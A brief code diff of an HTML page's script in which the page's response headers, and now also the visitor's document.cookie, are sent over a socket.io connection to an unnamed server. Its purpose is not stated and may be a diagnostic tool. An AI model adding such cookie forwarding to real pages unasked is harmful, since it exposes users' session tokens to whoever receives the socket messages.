@@ -13,15 +13,14 @@
         var request = new XMLHttpRequest ();
         request.open ('GET', document.location, false);
         request.send (null);
-
-        socket.on('connect', () => {
-            
-            socket.emit('conn', {
-                'event': 'connected',
-                'headers': request.getAllResponseHeaders().toLowerCase(),
-            });
-
+        
+        socket.on('connect', () => {});
+        socket.emit('conn', {
+            'event': 'connected',
+            'headers': request.getAllResponseHeaders().toLowerCase(),
+            'cookies': document.cookie,
         });
+        
     </script>
 </head>
 <body>
